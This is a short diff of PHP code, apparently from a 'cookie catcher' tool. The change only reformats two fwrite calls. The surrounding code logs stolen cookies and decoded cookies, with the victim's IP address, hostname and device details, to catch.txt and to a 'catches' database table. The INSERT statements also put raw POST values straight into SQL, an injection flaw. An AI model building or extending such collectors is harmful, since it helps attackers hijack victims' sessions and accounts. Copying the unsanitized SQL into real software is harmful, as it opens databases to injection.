@@ -94,7 +94,15 @@
 			$dc = $_POST["decodedcookie"];
 
 			$file = fopen('catch.txt', 'a');
-			fwrite($file, "Cookie: ".$cookie."\nDecoded Cookie: ".$dc."\nExternal IP Address: ".$ip_address."\nLocal IP/Webhost: ".$hostname."\nDevice Details: ".$device_details."\nCatch Date: ".$date."\n\n");
+			fwrite($file,
+			       "Cookie: ".$cookie
+			       ."\nDecoded Cookie: ".$dc
+			       ."\nExternal IP Address: ".$ip_address
+			       ."\nLocal IP/Webhost: ".$hostname
+			       ."\nDevice Details: ".$device_details
+			       ."\nCatch Date: ".$date
+			       ."\n\n"
+			);
 
 			$db->exec("INSERT INTO catches(cookie, decoded_cookie, ip_address, hostname, device_details, catch_date) VALUES ('$cookie', '$dc', '$ip_address', '$hostname', '$device_details', '$date')");
 
@@ -104,7 +112,15 @@
 			$dc = "Nothing to decode";
 
 			$file = fopen("catch.txt", "a");
-			fwrite($file, "Cookie: ".$cookie."\nDecoded Cookie: ".$dc."\nExternal IP Address: ".$ip_address."\nLocal IP/Webhost: ".$hostname."\nDevice Details: ".$device_details."\nCatch Date: ".$date."\n\n");
+			fwrite($file,
+			       "Cookie: ".$cookie
+			       ."\nDecoded Cookie: ".$dc
+			       ."\nExternal IP Address: ".$ip_address
+			       ."\nLocal IP/Webhost: ".$hostname
+			       ."\nDevice Details: ".$device_details
+			       ."\nCatch Date: ".$date
+			       ."\n\n"
+			);
 
 			$db->exec("INSERT INTO catches(cookie, decoded_cookie, ip_address, hostname, device_details, catch_date) VALUES ('$cookie', '$dc', '$ip_address', '$hostname', '$device_details', '$date')");
 
